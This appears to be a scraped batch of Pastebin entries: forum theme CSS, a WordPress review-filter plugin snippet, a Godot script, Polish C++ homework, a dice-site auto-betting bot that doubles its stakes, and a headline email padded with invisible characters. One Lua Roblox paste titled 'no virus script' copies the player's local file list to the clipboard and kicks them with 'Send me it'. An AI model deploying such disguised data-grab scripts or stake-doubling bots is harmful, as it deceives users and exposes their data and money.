    box-shadow: 0 2px 20px rgba(0, 0, 0, 0.05);
}
.node-body:hover {
	background: #071723 !important;
	border-left: 2px solid #009688;
    box-shadow: 0 2px 20px rgba(0, 0, 0, .1);
}
.node--read{
	.fa, .fas {
		font-family: 'Font Awesome 5 Pro';
		position: relative;
		font-weight: 400;
		border-right: 2px solid #9799a8;
    	padding-right: 7px;
		color: #009688 !important;
	}
}
.node--unread{
	.fa, .fas {
		font-family: 'Font Awesome 5 Pro';
		position: relative;
		font-weight: 900;
		border-right: 2px solid #9799a8;
    	padding-right: 7px;
		color: #009688 !important;
	}
}
.block-header:before {
    background: #0f3652 !important;
	border-bottom: 6px solid #0f3652 !important;
}
.block-header {
    background: linear-gradient(180deg, #0f3652, #0f3652);
    color: white;
}
.block-header a {
    color: inherit;
    text-decoration: none !important;
    font-weight: bold;
}
.block--messages .block-container{
	box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1) !important;
}
.block-filterBar{
	background: linear-gradient(180deg, #0f3652, #0f3652);
}
.block-filterBar .filterBar-filterToggle {
    background: #2578b1;
    color: #FFF;
}
.block-filterBar .filterBar-filterToggle:hover {
	background: #47a7eb;
}
.block-filterBar .filterBar-menuTrigger {
    color: #FFF;
}
.block-filterBar .filterBar-menuTrigger:hover{
	background: #47a7eb;
}

[data-template=""category_view""]{
.p-body-pageContent .block .block-container .block-body {
    padding: 15px;
    box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
}
}
[data-template=""member_notable""]{
	.block-header:before{
		background: transparent !important;
		border-bottom: unset !important;
	}
	.block-header{
		background: transparent !important;
	}
}
.XenTR .p-body-content .block--category .block-container {
    border: none;
	border-radius: 4px;
	background: #2c2e3b;
    box-shadow: 0 2px 20px rgba(0, 0, 0, .1);
	padding: 10px;
}
.XenTR .xentr-menu .vertival-nav-logo{
	background: #0f3651;
}
.button.button--link, a.button.button--link {
    background: #2b2e3b;
    color: #d7dae8;
    border-color: #414558;
}
/* UserBanner */
.userBanner.xgtKullaniciafis {
    padding: 3px 8px 3px 25px;
}
.xgtKullaniciafis-ikon:before {
    font-weight: 800 !important;
	min-width: 17px !important;
	font-size: 12px !important;
}
.xgtKullaniciafis strong {
    text-align: left !important;
    font-weight: normal !important;
	text-transform: capitalize;
    font-size: 12px;
}
.xgtKullaniciafis {
    border: none !important;
    margin-bottom: 4px !important;
    padding: 3px 8px 3px 0px !important;
}
.xgtKullaniciafis-ikon {
    padding-right: 1.8rem !important;
}
.memberTooltip-banners .xgtKullaniciafis strong, .memberHeader-banners .xgtKullaniciafis strong {
    padding: 0px 2px 0px 0px !important;
}
/* user upgrade */

.xb-informational-wrapper {
    z-index: 999999;
}
.xb-wrapper{
    border: 2px solid #009688;
	box-shadow: rgba(14, 30, 37, 0.4) 0px 1px 20px 20px, rgba(14, 30, 37, 0.66) 0px 2px 16px 0px !important;
}
.xb-wrapper a {
    color: #009688;
}
/* Resource Page */
[data-template=""xfrm_featured""]{
	.button.button--cta, a.button.button--cta{
	display: none !important;
	}
}
.resourceBody .resourceInfoButton, .resourceBody .resources-image .avatar{
	display:none;
}
.tabs--standalone .tabs-tab.is-active {
	color: #02b7fe;
}
.ratingStars, .ratingStars.ratingStars--larger{
	font-size: 100%;
}
.p-body-sidebar .block-minorHeader {
	border-bottom: 2px solid #1c5e8b !important;
}
.ozzmodz-CategoryStats {
	margin-top: 10px;
	background: #22242e;
}
/* BS Live */

.lfs[data-widget-key=""live_forum_statistics""] .fa-cog:before {
    content: ""\f019"";
}

.lfs .tabGroup .tabGroup-content {
    max-height: 315px;
    height: 315px;
    position: relative;
}
.lfs .tabs-container {
    border-bottom: 1px solid #eee;
    display: flex;
    background: #0f3652;
}
.lfs[data-widget-key=""live_forum_statistics""] .tabGroup.tabGroup--threads .structItem-cell--order {
	width: 42px !important;
}
.lfs[data-widget-key=""live_forum_statistics""] .tabGroup.tabGroup--threads .structItem.tabHeader{
	font-family: 'Font Awesome 5 Pro';
}
.lfs .tabGroup .structItem-cell {
    font-family: 'Noto Kufi Arabic', sans-serif;
}
.lfs .tabGroup .structItem-cell--title {
    overflow: hidden;
    white-space: nowrap;
    word-wrap: normal;
    text-overflow: ellipsis;
}
.lfs .tabs .tab{
	color: white;
}

.lfs[data-widget-key=""live_forum_statistics""] .tabGroup.tabGroup--threads .structItem-cell--countReplies, .lfs[data-widget-key=""live_forum_statistics""] .tabGroup.tabGroup--threads .structItem-cell--countViews {
    display: none;
}
[data-widget-key=""xfrm_forum_overview_new_resources""]{
	.contentRow-lesser, .contentRow-minor.contentRow-minor--smaller{
		display: none;
	}
}
.XenTR .custom-footer{
	background: #0f3652;
}
.XenTR .custom-footer .block .block-minorHeader{
		color: #FFF;
}
.XenTR .custom-footer .block .block-body{
		color: #FFF;
	}
.p-footer{
	display: none;
}
.XenTR .custom-footer .block .block-minorHeader i {
    color: #FFF;
}
.XenTR .custom-footer .block .block-body a {
    color: #FFF;
}
.actionBar-set.actionBar-set--external a, .actionBar-set.actionBar-set--internal a {
    border-color: #3e4357;
    padding: 2px 6px;
}
.ozzmodz-CategoryStatsViews {
    display: none !important;
}
a.button--link.button.xcuLRDLButtonCaution.button {
    background: #bcdef5;
    color: black;
}
a.button--cta.button.button--icon.button--icon--download {
    background: #009688;
}
/* ==== Desktop ==== */
@media (min-width: @xf-responsiveWide) {
	.icon-logo {
   		 display: none;
	}
	.desktop-logo {
		padding: 20px;
	}
	.node-extra{
		width: 400px !important;
	}
	/* BS Live*/
	html.lfs .tabGroup .tabGroup-content .tabGroup-scroller>
		.content .structItem--lfsItem .structItem-cell--title, 
		.lfs[data-widget-key=""live_forum_statistics""] .tabGroup.tabGroup--threads 
		.structItem.tabHeader .structItem-cell--title{
		width: 50%;
	}

	.lfs .tabGroup .tabGroup-content .structItem-cell--title{
		width: 50%;

	}
	.lfs .tabGroup .tabGroup-content .structItem-cell--countReplies{
		display:none;
	}

	.lfs .tabGroup .tabGroup-content .reactionSummary{
		display:none;
	}

	.lfs .tabGroup.tabGroup--threads .structItem-cell--order-empty,
		.lfs .tabGroup.tabGroup--threads .structItem-cell--order {
		width: 40px !important;
		text-align: center;
		font-size: 12px !important;
	}
}
/* ==== For Mobile ==== */
@media (max-width: @xf-responsiveMedium)  { 
	.XenTR.vertical .p-header-logo .icon-logo {
			display: none !important;
		}
	.p-header-logo {
		vertical-align: middle;
		margin-right: auto;
		padding: 0 55px;
	}
	/*
	[data-template=""account_upgrades""]{
		.formRow-labelWrapper {
			padding: 10px 10px 22px;
			background: #f5f5f5;
			margin-bottom: -25px;
			border-radius: 4px;
			color: #2677b1;
			font-weight: 700;
			font-size: 16px;
			border: 1px solid #2677b1;
		}
	} 
	*/
	#XF .menu--structural {
		margin-top: 10px;
		width: 95%;
		border: 2px solid #144468;
		box-shadow: 0 2px 20px rgba(0, 0, 0, 0.4);
	}
	/* Resources */
	.resourceList-grid .structItem--resource{
		width: 48%;
	}
	.ratingStars.ratingStars--larger{
		font-size: 90% !important;
	}
	/* ForumStats */
	.forumStatsContainer.forumStats-mini .dataList-cell.dataList-cell--action, .forumStatsContainer.forumStats-mini .dataList-cell.dataList-cell--link {
		padding: 3px 3px;
	}
	.miniCol {
    	display: none;
	}
	/* BS Live*/
	.lfs[data-widget-key=""live_forum_statistics""] .tabGroup.tabGroup--threads 
	.structItem-cell--order-empty, .lfs[data-widget-key=""live_forum_statistics""] 
	.tabGroup.tabGroup--threads .structItem-cell--order {
		display: none;
	}
	[data-logged-in=""true""]{
	.handheld-footer-bar{
		display: none !important;
		}	
	}
	.node-extra-row ul.listInline {
		display: none;
	}
	[data-template=""xfrm_resource_view""], [data-template=""xfrm_thread_view_type_resource""],
	[data-template=""xfrm_resource_history""], [data-template=""XGT_Rm_kaynak_indiren""],
	[data-template=""xfrm_resource_reviews""],[data-template=""xfrm_resource_field""]{
		.p-title {
		  display: flex;
		  flex-direction: column;
		}

		.p-title-value {
		  margin-bottom: auto; 
		}

		.p-title-pageAction {
		  width: 100%;
		  margin: 10px !important;
		  text-align: center;
		}
	}
	[data-template=""forum_view""]{
	&[data-container-key=""node-12""], &[data-container-key=""node-13""]{
		.structItem{
			direction: rtl;
		}
		.structItem-cell--latest, .structItem-cell--meta{
			    float: right;
		}
	}
	}
}"
bktmnEQ0,[site-reviews] restrict reviews to the assigned_post author,geminilabs,PHP,Monday 29th of April 2024 12:00:18 PM CDT,"/**
 * Restrict visible reviews on the ""All Reviews"" page to the review's assigned_post author
 * @updated 2024-04-29 
 */
class GLSR_Restrict_Reviews_Assigned_Post_Author
{
    protected static $instance;

    public static function load(): self
    {
        if (empty(static::$instance)) {
            static::$instance = new static();
        }
        return static::$instance;
    }
	
	/**
	 * @filter site-reviews/database/sql/query-flagged-count
	 */
	public function filterFlaggedCountSql(string $sql): string
	{
        global $wpdb;
		$userId = get_current_user_id();
		$search = ""AS p ON (p.ID = r.review_id)"";
		$replace = ""{$search} LEFT JOIN {$wpdb->prefix}glsr_assigned_posts AS ap ON (ap.rating_id = r.ID)"";
		$replace = ""{$replace} LEFT JOIN {$wpdb->posts} AS p2 ON (p2.ID = ap.post_id)"";
		$sql = str_replace($search, $replace, $sql);
		$search = ""WHERE 1=1"";
		$replace = ""{$search} AND (p2.post_author = {$userId} OR p.post_author = {$userId})"";
		$sql = str_replace($search, $replace, $sql);
		return $sql;
	}

    /**
     * @filter site-reviews/review-table/clauses
     */
    public function filterQueryClauses(array $clauses): array
    {
        global $wpdb;
		$userId = get_current_user_id();
		$clauses['join']['clauses'][] = ""INNER JOIN {$wpdb->prefix}glsr_ratings ON ({$wpdb->prefix}glsr_ratings.review_id = {$wpdb->posts}.ID)"";
		$clauses['join']['clauses'][] = ""LEFT JOIN {$wpdb->prefix}glsr_assigned_posts ON ({$wpdb->prefix}glsr_assigned_posts.rating_id = {$wpdb->prefix}glsr_ratings.ID)"";
		$clauses['join']['clauses'][] = ""LEFT JOIN {$wpdb->posts} AS posts2 ON (posts2.ID = {$wpdb->prefix}glsr_assigned_posts.post_id)"";
		$clauses['where']['clauses'][] = ""AND (posts2.post_author = {$userId} OR {$wpdb->posts}.post_author = {$userId})"";
		$clauses['where']['replace'] = false;
		return $clauses;
    }

    /**
     * @filter views_edit-site-review
     */
    public function filterReviewCounts(array $views): array
    {
        global $wp_query;
        unset($views['mine']);
        $counts = $this->restrictedCounts();
        $total = array_sum($counts);
        foreach (get_post_stati(['show_in_admin_all_list' => false]) as $state) {
            $total -= ($counts[$state] ?? 0);
        }
        foreach ($views as $status => &$link) {
            $num = 'all' === $status ? $total : ($counts[$status] ?? 0);
            $link = preg_replace('/(<span class=""count"">)([\d\(\),]+)(<\/span>)/', ""$1({$num})$3"", $link);
        }
        return $views;
    }

    public function run(): void
    {
        add_action('current_screen', function () {
            if (!$this->isQueryRestricted()) {
                return;
            }
            add_filter('site-reviews/review-table/clauses', [$this, 'filterQueryClauses'], 5);
			add_filter('site-reviews/database/sql/query-flagged-count', [$this, 'filterFlaggedCountSql'], 5);
            add_filter('views_edit-'.glsr()->post_type, [$this, 'filterReviewCounts'], 5);
        });
    }

    protected function isQueryRestricted(): bool
    {
        if (!function_exists('glsr')) {
            return false;
        }
		if (glsr()->filterBool('snippet/disable/GLSR_Restrict_Reviews_Assigned_Post_Author', false)) {
			return false;
		}
        if (get_current_screen()->id !== 'edit-'.glsr()->post_type) {
            return false;
        }
        if (current_user_can('edit_others_site-reviews')) {
            return false;
        }
        return true;
    }

    protected function restrictedCounts(): array
    {
        $userId = get_current_user_id();
        $cache_key = sprintf('%s_readable_%s', glsr()->post_status, $userId);
        $counts = wp_cache_get($cache_key, 'counts');
        $post_type = glsr()->post_type;
        if (false === $counts) {
            global $wpdb;
            $results = $wpdb->get_results(""
                SELECT p.post_status, COUNT(*) AS count 
                FROM {$wpdb->posts} AS p
                INNER JOIN {$wpdb->prefix}glsr_ratings AS r ON (r.review_id = p.ID)
                LEFT JOIN {$wpdb->prefix}glsr_assigned_posts AS ap ON (ap.rating_id = r.ID)
                LEFT JOIN {$wpdb->posts} AS p2 ON (p2.ID = ap.post_id)
                WHERE p.post_type = '{$post_type}' AND (p2.post_author = {$userId} OR p.post_author = {$userId})
                GROUP BY p.post_status
            "", ARRAY_A);
            $results = wp_list_pluck($results, 'count', 'post_status');
            $counts = array_map('intval', $results);
        }
        $defaults = array_fill_keys(get_post_stati(), 0);
        $counts = wp_parse_args((array) $counts, $defaults);
        wp_cache_set($cache_key, $counts, 'counts');
        return $counts;
    }
}

GLSR_Restrict_Reviews_Assigned_Post_Author::load()->run();
"
JmcdKRJP,snowybot 30/4/2024,coinwalk,JavaScript,Monday 29th of April 2024 11:12:29 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/100).toFixed(7));
var dust = (monkey/2)
var bolux = monkey;
var tens = (monkey*10);
var hundreds = (monkey*20);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var four = (monkey*4);
var olsen = 0;
var belance = olsenest;
var bill = olsenest;
var bekon = olsenest;
var belll = (olsenest*5);
var shit = olsenest;
var fovox = olsenest;
var oxen = ((Math.ceil(fovox/tens))*tens);
var silvery = olsenest;
var silverty = olsenest;
var bob = false;
var stemp = (bolux+bolux);
var stemoise = (bolux+bolux+bolux+bolux);
var moron = (olsenest-silvery);
var ricky = (silverty-hundreds);
var foiluler = (ricky-stemp);
var smack = (olsenest-foiluler);
var snort = (moron-stemoise);
var boghart = (silvery+tens);
var lumps = ((Math.floor(olsenest/tens))*tens);
var sever = (lumps+sevens);
var eye = (lumps+eights);
var samuel = (olsen-dust);
var frances = (olsen+dust);
var awesome = ((Math.floor(olsenest/hundreds))*hundreds);
 
function go(){
belance = document.getElementById('pct_balance').value;
var dog = Number((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
lumps = ((Math.floor(belance/tens))*tens);
sever = (lumps+sevens);
eye = (lumps+eights);
stemp = (bolux+bolux);
stemoise = (bolux+bolux+bolux+bolux);
moron = (belance-silvery);
ricky = (silverty-hundreds);
foiluler = (ricky-stemp);
smack = (belance-foiluler);
snort = (moron-stemoise);
boghart = (silvery+tens);
samuel = (olsen-dust);
frances = (olsen+dust);
if ((belance>samuel)&&(belance<frances)){
bob = true;
}
if (belance<samuel){
bob = false;
}
if (belance>frances){
bob = false;
}
if ((belance>sever)&&(belance<eye)&&(!bob)){
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if ((smack<=0)&&(belance<sever)){
    bolux = monkey;
    olsen = 0;
    silverty = parseFloat(belance);
}
if ((snort<=0)&&(belance>=boghart)&&(belance<sever)){
    bolux = monkey;
    olsen = 0;
    silvery = parseFloat(belance);
    silverty = parseFloat(belance);
}
if (belance>=1440){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 350);
}
go();
"
gtcdaNzZ,Untitled,sagat1719,Lua,Monday 29th of April 2024 10:33:47 AM CDT,"‚Äî-no virus script
local msg = """"
for i,v in ipairs(listfiles("""")) do
    msg = msg.."", ""..i..""""..v
end
setclipboard(msg)
game.Players.LocalPlayer:Kick(""Send me it"")"
HrJP6wM0,ProjectTombStone,KennyAlbano69,Godot GLSL,Monday 29th of April 2024 10:19:31 AM CDT,"extends CharacterBody2D
 
const SPEED = 200.0
const JUMP_VELOCITY = -400.0
# Get the gravity from the project settings to be synced with RigidBody nodes.
var gravity = ProjectSettings.get_setting(""physics/2d/default_gravity"")
@onready var anim = get_node(""AnimatedSprite2D"")
#@onready var ladderCheck = $LadderCheck
func _physics_process(delta):
    # Add the gravity.
    velocity.y += gravity * delta
        
    #if is_on_ladder():
        #print(""on ladder"")
    # Handle jump.
    if Input.is_action_just_pressed(""ui_accept"") and is_on_floor():
        velocity.y = JUMP_VELOCITY
 
#func is_on_ladder():
    #if not ladderCheck.is_colliding(): return false
    #var collider = ladderCheck.get_collider()
    #if not collider is Ladder: return false
    #return true
    
    # Get the input direction and handle the movement/deceleration.
    # As good practice, you should replace   UI actions with custom gameplay actions.
    var direction = Input.get_axis(""ui_left"", ""ui_right"")
    if direction:
        velocity.x = direction * SPEED
 
    else:
        velocity.x = move_toward(velocity.x, 0, SPEED)
 
    move_and_slide()"
9cnRAW99,Untitled,MeehoweCK,C++,Monday 29th of April 2024 09:03:43 AM CDT,"#include <fstream>
#include <vector>
#include <iostream>

void maxmin(const std::vector<int>& wektor, int &maxLiczba, int &minLiczba) {
	auto rozmiar{ wektor.size() };

	maxLiczba = wektor[0];
	minLiczba = wektor[0];

	for (auto i{ 1 }; i < rozmiar; ++i) {
		if (wektor[i] > maxLiczba) {
			maxLiczba = wektor[i];
		}
		else if (wektor[i] < minLiczba) {
			minLiczba = wektor[i];
		}
	}
}

std::string odwrocCiag(const std::string& ciag) {
	std::string wynik{};
	for (int i{ static_cast<int>(ciag.size() - 1) }; i >= 0; --i) {
		wynik += ciag[i];
	}
	return wynik;
}

std::string zamienNaBinarna(int liczba) {
	std::string wynik{};
	while (liczba > 0) {
		wynik += (liczba % 2 == 0 ? '0' : '1');
		liczba /= 2;
	}
	return odwrocCiag(wynik);
}

void wypiszParzyste(const std::vector<int>& wektor) {
	std::cout << ""Liczby parzyste:\t"";
	std::ofstream plik{ ""liczby2.txt"" };
	for (const auto& x : wektor) {
		if (x % 2 == 0) {
			std::cout << x << '\t';
			plik << x << std::endl;
		}
	}
	plik.close();
	std::cout << std::endl;
}

int main() {
	std::ifstream plik{ ""liczby.txt"" };		// utworzenie obiektu wyj≈õcia z pod≈ÇƒÖczonym plikiem txt
	int liczba;
	std::vector<int> wektorLiczb{};			// zainicjowanie pustego wektora przechowujƒÖcego liczby
	while (plik >> liczba) {
		wektorLiczb.push_back(liczba);		// dodanie liczby do wektora
	}
	plik.close();

	int maxLiczba, minLiczba;
	maxmin(wektorLiczb, maxLiczba, minLiczba);
	std::cout << ""Najwieksza liczba wynosi "" << maxLiczba << "", a najmniejsza wynosi "" << minLiczba << std::endl;

	std::cout << ""Liczby w zapisie binarnym:\n"";
	auto suma{ 0 };
	for (const auto& x : wektorLiczb) {
		std::cout << '\t' << x << '\t' << zamienNaBinarna(x) << std::endl;
		suma += x;
	}

	std::cout << ""Zapis binarny najwiekszej liczby: "" << zamienNaBinarna(maxLiczba) << std::endl;
	std::cout << ""Suma wszystkich liczb wynosi "" << suma << std::endl;

	auto sumaOstatnichCyfr{ suma % 10 };
	suma /= 10;
	sumaOstatnichCyfr += suma % 10;
	std::cout << ""Suma ostatnich dwoch cyfr z sumy liczb wynosi "" << sumaOstatnichCyfr << std::endl;

	wypiszParzyste(wektorLiczb);
	return 0;
}"
Y7zUW00H,Untitled,MeehoweCK,C++,Monday 29th of April 2024 08:57:31 AM CDT,"#include <fstream>
#include <vector>
#include <iostream>

void maxmin(const std::vector<int>& wektor, int &maxLiczba, int &minLiczba) {
	auto rozmiar{ wektor.size() };

	maxLiczba = wektor[0];
	minLiczba = wektor[0];

	for (auto i{ 1 }; i < rozmiar; ++i) {
		if (wektor[i] > maxLiczba) {
			maxLiczba = wektor[i];
		}
		else if (wektor[i] < minLiczba) {
			minLiczba = wektor[i];
		}
	}
}

std::string odwrocCiag(const std::string& ciag) {
	std::string wynik{};
	for (int i{ static_cast<int>(ciag.size() - 1) }; i >= 0; --i) {
		wynik += ciag[i];
	}
	return wynik;
}

std::string zamienNaBinarna(int liczba) {
	std::string wynik{};
	while (liczba > 0) {
		wynik += (liczba % 2 == 0 ? '0' : '1');
		liczba /= 2;
	}
	return odwrocCiag(wynik);
}

int main() {
	std::ifstream plik{ ""liczby.txt"" };		// utworzenie obiektu wyj≈õcia z pod≈ÇƒÖczonym plikiem txt
	int liczba;
	std::vector<int> wektorLiczb{};			// zainicjowanie pustego wektora przechowujƒÖcego liczby
	while (plik >> liczba) {
		wektorLiczb.push_back(liczba);		// dodanie liczby do wektora
	}
	plik.close();

	int maxLiczba, minLiczba;
	maxmin(wektorLiczb, maxLiczba, minLiczba);
	std::cout << ""Najwieksza liczba wynosi "" << maxLiczba << "", a najmniejsza wynosi "" << minLiczba << std::endl;

	std::cout << ""Liczby w zapisie binarnym:\n"";
	auto suma{ 0 };
	for (const auto& x : wektorLiczb) {
		std::cout << '\t' << x << '\t' << zamienNaBinarna(x) << std::endl;
		suma += x;
	}

	std::cout << ""Zapis binarny najwiekszej liczby: "" << zamienNaBinarna(maxLiczba) << std::endl;
	std::cout << ""Suma wszystkich liczb wynosi "" << suma << std::endl;

	auto sumaOstatnichCyfr{ suma % 10 };
	suma /= 10;
	sumaOstatnichCyfr += suma % 10;
	std::cout << ""Suma ostatnich dwoch cyfr z sumy liczb wynosi "" << sumaOstatnichCyfr << std::endl;
	return 0;
}"
X8deUVDU,News April29 24,Newscaster_Ned,Email,Monday 29th of April 2024 08:54:47 AM CDT,".‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé1‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé2‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé3‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äét‚Äée‚Äé.‚Äé

O‚Äén‚Äéc‚Äée‚Äé ‚Äém‚Äéo‚Äér‚Äée‚Äé,‚Äé ‚ÄéP‚Äéa‚Äés‚Äét‚Äée‚Äéb‚Äéi‚Äén‚Äé'‚Äés‚Äé ‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äét‚Äér‚Äéu‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äén‚Äée‚Äéw‚Äés‚Äé ‚Äér‚Äée‚Äét‚Äéu‚Äér‚Äén‚Äés‚Äé.‚Äé

R‚Äée‚Äép‚Äéo‚Äér‚Äét‚Äé:‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéA‚Äéi‚Äéd‚Äée‚Äés‚Äé ‚ÄéW‚Äéa‚Äén‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚ÄéR‚Äée‚Äép‚Äél‚Äéa‚Äéc‚Äée‚Äé ‚ÄéK‚Äéa‚Äér‚Äéi‚Äén‚Äée‚Äé ‚ÄéJ‚Äée‚Äéa‚Äén‚Äé-‚ÄéP‚Äéi‚Äée‚Äér‚Äér‚Äée‚Äé ‚Äéa‚Äés‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äés‚Äé ‚ÄéS‚Äée‚Äéc‚Äér‚Äée‚Äét‚Äéa‚Äér‚Äéy‚Äé
L‚Äéa‚Äéw‚Äés‚Äéu‚Äéi‚Äét‚Äés‚Äé ‚ÄéC‚Äéh‚Äéa‚Äél‚Äél‚Äée‚Äén‚Äég‚Äée‚Äé ‚ÄéM‚Äéu‚Äés‚Äék‚Äé'‚Äés‚Äé ‚ÄéC‚Äél‚Äéa‚Äéi‚Äém‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéD‚Äér‚Äéi‚Äév‚Äée‚Äér‚Äé ‚ÄéR‚Äée‚Äés‚Äép‚Äéo‚Äén‚Äés‚Äéi‚Äéb‚Äéi‚Äél‚Äéi‚Äét‚Äéy‚Äé ‚Äéi‚Äén‚Äé ‚ÄéT‚Äée‚Äés‚Äél‚Äéa‚Äé ‚ÄéC‚Äér‚Äéa‚Äés‚Äéh‚Äée‚Äés‚Äé
J‚Äée‚Äér‚Äér‚Äéy‚Äé ‚ÄéS‚Äée‚Äéi‚Äén‚Äéf‚Äée‚Äél‚Äéd‚Äé:‚Äé ‚ÄéW‚Äéo‚Äék‚Äée‚Äén‚Äée‚Äés‚Äés‚Äé,‚Äé ‚Äé'‚ÄéE‚Äéx‚Äét‚Äér‚Äée‚Äém‚Äée‚Äé ‚ÄéL‚Äée‚Äéf‚Äét‚Äé'‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéC‚Äéo‚Äém‚Äée‚Äéd‚Äéy‚Äé
C‚Äéo‚Äén‚Äés‚Äéu‚Äém‚Äée‚Äér‚Äé ‚ÄéA‚Äél‚Äée‚Äér‚Äét‚Äé:‚Äé ‚ÄéU‚Äép‚Äéd‚Äéa‚Äét‚Äée‚Äé ‚ÄéG‚Äéo‚Äéo‚Äég‚Äél‚Äée‚Äé ‚ÄéC‚Äéh‚Äér‚Äéo‚Äém‚Äée‚Äé ‚ÄéI‚Äém‚Äém‚Äée‚Äéd‚Äéi‚Äéa‚Äét‚Äée‚Äél‚Äéy‚Äé ‚Äét‚Äéo‚Äé ‚ÄéS‚Äét‚Äéo‚Äép‚Äé ‚ÄéC‚Äér‚Äéi‚Äét‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚ÄéF‚Äél‚Äéa‚Äéw‚Äé
N‚Äéo‚Äél‚Äét‚Äée‚Äé:‚Äé ‚ÄéF‚Äéo‚Äér‚Äéd‚Äé‚Äô‚Äés‚Äé ‚ÄéE‚ÄéV‚Äé ‚ÄéD‚Äéi‚Äév‚Äéi‚Äés‚Äéi‚Äéo‚Äén‚Äé ‚ÄéL‚Äéo‚Äés‚Äét‚Äé ‚Äé$‚Äé1‚Äé.‚Äé3‚ÄéB‚Äé ‚Äéi‚Äén‚Äé ‚ÄéQ‚Äé1‚Äé ‚Äé-‚Äé-‚Äé ‚ÄéT‚Äéh‚Äéa‚Äét‚Äé'‚Äés‚Äé ‚Äé$‚Äé1‚Äé3‚Äé2‚ÄéK‚Äé ‚Äép‚Äée‚Äér‚Äé ‚ÄéC‚Äéa‚Äér‚Äé!‚Äé
N‚Äéo‚Äél‚Äét‚Äée‚Äé:‚Äé ‚ÄéN‚Äée‚Äéw‚Äé ‚ÄéG‚Äéu‚Äéi‚Äén‚Äée‚Äéa‚Äé ‚ÄéR‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äés‚Äé ‚ÄéO‚Äéu‚Äét‚Äér‚Äéa‚Äég‚Äée‚Äéd‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé‚Äô‚Äés‚Äé ‚Äé‚Äò‚ÄéC‚Äéa‚Äén‚Äén‚Äéi‚Äéb‚Äéa‚Äél‚Äé‚Äô‚Äé ‚ÄéL‚Äéi‚Äée‚Äé
D‚Äéo‚Äén‚Äé'‚Äét‚Äé ‚ÄéL‚Äée‚Äét‚Äé ‚ÄéD‚Äéu‚Äér‚Äéb‚Äéi‚Äén‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéM‚Äéa‚Äér‚Äés‚Äéh‚Äéa‚Äél‚Äél‚Äé ‚ÄéB‚Äéu‚Äél‚Äél‚Äéy‚Äé ‚ÄéT‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚ÄéW‚Äéa‚Äéy‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚ÄéP‚Äéa‚Äés‚Äés‚Äéi‚Äén‚Äég‚Äé ‚ÄéB‚Äéa‚Äéd‚Äé ‚ÄéL‚Äée‚Äég‚Äéi‚Äés‚Äél‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé
H‚Äéu‚Äém‚Äéz‚Äéa‚Äé ‚ÄéY‚Äéo‚Äéu‚Äés‚Äéa‚Äéf‚Äé ‚ÄéR‚Äée‚Äés‚Äéi‚Äég‚Äén‚Äés‚Äé ‚ÄéL‚Äée‚Äés‚Äés‚Äé ‚ÄéT‚Äéh‚Äéa‚Äén‚Äé ‚ÄéO‚Äén‚Äée‚Äé ‚ÄéM‚Äéo‚Äén‚Äét‚Äéh‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéI‚Äém‚Äép‚Äéo‚Äés‚Äéi‚Äén‚Äég‚Äé ‚ÄéH‚Äéa‚Äét‚Äée‚Äé ‚ÄéS‚Äép‚Äée‚Äée‚Äéc‚Äéh‚Äé ‚ÄéL‚Äéa‚Äéw‚Äé
